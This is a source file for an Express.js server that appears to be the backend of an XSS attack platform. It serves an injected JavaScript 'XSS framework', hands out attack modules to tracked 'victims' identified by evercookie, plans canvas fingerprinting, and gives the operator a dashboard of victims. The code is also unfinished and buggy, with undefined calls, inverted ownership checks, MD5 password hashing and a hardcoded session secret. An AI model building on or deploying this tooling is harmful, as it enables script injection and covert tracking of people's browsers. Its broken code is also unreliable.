var express = require('express'),
    session = require('express-session'),
    cookieParser = require('cookie-parser'),
    bodyParser = require('body-parser'),
    evercookie = require('evercookie'),
    mongoose = require('mongoose'),
    logger = require('morgan'),
    crypto = require('crypto'),
    csrf = require('csurf'),
    ejs = require('ejs'),
    fs = require('fs'),
    app = express();

//   数据库
var sql = require('./models');
mongoose.connect(sql.Db);

//   模板引擎
app.set('view engine', 'ejs');
app.engine('html', ejs.renderFile);

//   其它
app.use(logger());
app.use(cookieParser());
app.use(evercookie.backend());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded());
app.use(session({
    secret:'session'
}));
app.use(csrf());
function err404(req, res, next){
    return res.send(404, '( ・_・)');
};
app.use('/static', express.static(__dirname+'/static'));
app.use('/home', function(req, res, next){
    if(!req.session.user){return err404(req, res, next)};
    res.locals.token = req.csrfToken();
    res.header('X-Frame-Options', 'DENY');
    next();
});

//   TODO 长逻辑, XSS处理部分
app.all('/', function(req, res){
    // 返回XSS JS 框架
    return res.render('bungeegum', {
        domain:req.header('host'),
        id:req.query.i
    });
});
app.all('/i/', function(req, res){
    // 返回模块
    //TODO who id use "Canvas Fingerprinting"
    var id = req.params.i;
    var who = req.cookies.who;
    sql.Victim.findOne({who:who}, function(err, info){
        if(info){
            return render('load', {
                modules:info.modules
            });
        };
        sql.Item.findOne({id:id}, function(err, info){
            return render('load', {
                modules:info.modules
            });
        });
    });
});
function page(req, res){
    var pageid = req.params.uri;
    sql.Page.findOne({uri:pageid}, function(err, info){
        var owner = req.session.user&&(req.session.user.name == info.owner);
        if(info.type == 'short'){
            //TODO
        };
        if(info.type == 'long'){
            //TODO
        };
    });
    return res.send('Hello world.'+req.params.uri);
};
app.all('/h/:uri', page);
app.all('/home/page/:uri', page);

//   用户相关
app.route('/login')
    .get(function(req, res){
        return res.render('login', {err:''});
    })
    .post(function(req, res){
        var name = req.body.name;
        var passwd = req.body.passwd;
        sql.User.findOne({name:name}, function(err, info){
            if(!info){return res.render('login', {err:'login failed.'})};
            passwd = crypto.createHash('md5').update(
                passwd + info.salt
            ).digest('hex');
            sql.User.findOne({name:name, passwd:passwd}, function(err, info){
                if(!info){return res.render('login', {err:'login failed.'})};
                req.session.user = info;
                return res.redirect('/home');
            });
        });
    });
app.post('/home/logout', function(req, res){
    req.session.user = null;
    return res.redirect('/login');
});

// 用户页面
app.get('/home', function(req, res){
    var victim, page;
    sql.Victim.find({name:req.session.user.name}, function(err, info){
        victims = info;
        sql.Page.find({name:req.session.user.name}, function(err, info){
            pages = info;
            sql.Item.find({name:req.session.user.name}, function(err, info){
                items = info;
                return res.render('home', {
                    items:items,
                    victims:victims,
                    pages:pages
                });
            });
        });
    });
});

app.get('/home/item/:id', function(req, res){
    sql.Item.findOne({id:req.params.id}, function(err, info){
        if(info.owner == req.session.user.name){return null};
        return res.render('edit', {
            items:info
        });
    });
//    return err404(req, res);
});
app.get('/home/victim/:id', function(req, res){
    sql.Victim.findOne({id:req.params.id}, function(err, info){
        if(info.owner == req.session.user.name){return null};
        return res.render('edit', {
            victims:info
        });
    });
});
app.get('/home/page/:uri/edit', function(req, res){
    sql.Page.findOne({uri:req.params.uri}, function(err, info){
        if(info.owner == req.session.user.name){return null};
        return res.render('editpage', {
            pages:info
        });
    });
});

//   TODO 设置
app.post('/home/victim/:id/edit', function(){});
app.post('/home/page/:uri/edit', function(){});

app.use('*', err404);

app.listen(process.env.OPENSHIFT_NODEJS_PORT || 8080,
    process.env.OPENSHIFT_NODEJS_IP);
